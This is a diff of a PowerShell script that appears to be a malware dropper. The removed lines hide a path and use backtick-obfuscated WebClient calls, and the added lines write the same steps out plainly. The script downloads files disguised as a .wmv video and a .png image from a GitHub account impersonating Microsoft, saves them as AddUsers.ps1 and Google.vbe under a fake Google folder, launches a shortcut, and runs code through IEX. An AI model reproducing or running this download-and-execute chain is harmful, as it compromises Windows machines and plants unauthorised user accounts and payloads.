@@ -103,7 +103,7 @@ else{
 
 start-sleep -s 3
 
- $defender = 'C:\Prog^^^^^^^^^^^^^^^^^^le\Maps\'.Replace("^^^^^^^^^^^^^^^^^^","ramData\Goog")
+ $defender = 'C:\ProgramData\Google\Maps\'
  
 
  
@@ -134,16 +134,16 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 
 
 
-if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/microsoft-services/staff/settings/all.wmv', $defender + 'AddUsers.ps1')){
+if((New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/all.wmv', $defender + 'AddUsers.ps1')){
 }
 
- $def = 'C:\Prog^^^^^^^^^^^^^^^^^^le\Maps\'.Replace("^^^^^^^^^^^^^^^^^^","ramData\Goog")
+ $def = 'C:\ProgramData\Google\Maps\'
 
 
 
 
 
-if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/microsoft-services/staff/settings/ss.png', $def + 'Google.vbe')){
+if((New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/ss.png', $def + 'Google.vbe')){
 }
 
 
@@ -165,8 +165,8 @@ start-sleep -s 3
 
 start-sleep -s 60
  Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
-start-sleep -s 60
- Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
+# start-sleep -s 6
+# Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
 }
 }
 IEX MicrosoftStaff
